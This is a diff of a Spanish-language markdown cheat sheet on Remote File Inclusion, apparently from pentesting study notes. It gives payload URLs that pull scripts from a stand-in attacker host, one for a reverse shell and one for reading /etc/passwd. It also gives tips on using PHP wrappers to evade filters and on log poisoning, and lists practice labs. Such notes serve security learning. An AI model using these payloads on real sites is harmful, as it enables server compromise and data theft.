@@ -1,24 +1,45 @@
-## Remote File Inclusion (RFI)
-- The Remote File Inclusion (RFI) vulnerability is a security flaw where an attacker can include remote 
-files in a vulnerable web application. 
-This can allow the attacker to execute malicious code on the web server and compromise the system.
+## Inclusión Remota de Archivos (RFI)
+- La vulnerabilidad de Inclusión Remota de Archivos (RFI) es una fallo de seguridad en la que un atacante puede incluir archivos remotos en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.
 
-- In an RFI attack, the attacker uses user input, such as a URL or form field, to include a remote file 
-in the request. If the web application does not properly validate these inputs, it will process the 
-request and return the content of the remote file to the attacker.
+- En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.
 
-- An attacker can exploit this vulnerability to include malicious remote files containing harmful code, 
-such as viruses or trojans, or to execute commands on the vulnerable server. In some cases, the attacker 
-can direct the request to a PHP resource hosted on their own server, giving them a higher degree of control 
-in the attack.
+- Un atacante puede explotar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código dañino o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.
 
-## Basic RFI attack:
+## Ejemplo básico de ataque RFI:
 
-```ruby
-http://vulnerable-site.com/index.php?page=http://attacker-site.com/malicious-script.php
+```php
+http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/script-malicioso.php
 ```
 
-### RFI with PHP wrapper:
-```ruby
-http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=http://attacker-site.com/malicious-script.php
+### Ejemplo con wrapper PHP:
+```php
+http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=http://sitio-del-atacante.com/script-malicioso.php
 ```
+
+## Ejemplo avanzado de ataque RFI:
+
+- Inclusión de un archivo remoto para obtener una shell inversa:
+```php
+http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/shell.php
+```
+
+- Uso de un archivo remoto para leer el contenido de un archivo sensible en el servidor:
+```php
+http://sitio-vulnerable.com/index.php?page=http://sitio-del-atacante.com/leer-archivo.php?archivo=/etc/passwd
+```
+
+## Herramientas y recursos para practicar:
+
+- **DVWP (Damn Vulnerable Web Project):** Un laboratorio para practicar vulnerabilidades como RFI.
+  - Enlace al proyecto: [DVWP](https://github.com/vavkamil/dvwp)
+
+- **Gwolle Guestbook:** Un plugin de WordPress que puede ser utilizado para pruebas de vulnerabilidades.
+  - Enlace de descarga: [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)
+
+## Consejos para explotarlo:
+
+1. **Validar entradas:** Verifica si las entradas del usuario son validadas correctamente. Intenta incluir URLs externas y observa el comportamiento de la aplicación.
+
+2. **Pruebas con wrapper de PHP:** Utiliza wrapper como `php://input`, `php://filter`, o `data://` para evadir restricciones.
+
+3. **Logs del servidor:** En algunos casos, los logs del servidor pueden ser explotados para incluir código malicioso. Intenta apuntar a rutas como `/var/log/apache2/access.log`.
